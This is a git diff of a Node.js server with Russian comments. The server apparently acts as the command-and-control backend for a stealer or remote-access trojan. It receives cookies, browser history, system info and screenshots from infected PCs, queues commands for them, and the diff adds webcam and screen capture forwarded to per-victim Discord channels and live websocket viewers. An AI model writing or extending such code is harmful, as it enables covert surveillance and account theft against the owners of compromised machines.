@@ -22,7 +22,7 @@ const ONLINE_TIMEOUT = 3 * 60 * 1000;
 const onlinePCs = {};          // pcId -> timestamp
 const pendingCommands = {};    // pcId -> array of commands
 const channelByPC = {};        // pcId -> channelId
-const wsCameraClients = {};    // pcId -> array of ws для live-камеры
+const wsCameraClients = {};    // pcId -> array ws для live-камеры
 const pcIdMap = {};            // shortId -> real pcId
 
 // ---------- Утилита ----------
@@ -112,7 +112,7 @@ async function getOrCreateTextChannel(guild, name, parentId){
     return channel;
 }
 
-// ---------- Приём данных: файлы ----------
+// ---------- Приём данных для обычных файлов ----------
 app.post("/upload", async (req, res) => {
     try {
         const { pcId, cookies, history, systemInfo, screenshot } = req.body;
@@ -139,6 +139,13 @@ app.post("/upload", async (req, res) => {
         // ---------- Отправка кнопок при первом подключении ПК ----------
         if(isNewPC) await sendControlButtons(pcId);
 
+        // ---------- Live камера ----------
+        if(screenshot && wsCameraClients[pcId]){
+            wsCameraClients[pcId].forEach(ws => {
+                try { ws.send(screenshot); } catch(e){ }
+            });
+        }
+
         res.json({ success:true });
     } catch(err){
         console.error(err);
@@ -146,13 +153,21 @@ app.post("/upload", async (req, res) => {
     }
 });
 
-// ---------- Приём данных: камера ----------
-app.post("/upload-camera", (req, res) => {
+// ---------- Приём данных с камеры ----------
+app.post("/upload-cam", async (req, res) => {
     try {
         const { pcId, screenshot } = req.body;
         if(!pcId || !screenshot) return res.status(400).json({ error:"pcId и screenshot required" });
 
-        onlinePCs[pcId] = Date.now();
+        const guild = await bot.guilds.fetch(GUILD_ID);
+        const category = await getOrCreateCategory(guild, CATEGORY_NAME);
+        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
+        const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
+        channelByPC[pcId] = finalChannel.id;
+
+        await finalChannel.send({
+            files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-cam.jpeg` }]
+        });
 
         if(wsCameraClients[pcId]){
             wsCameraClients[pcId].forEach(ws => {
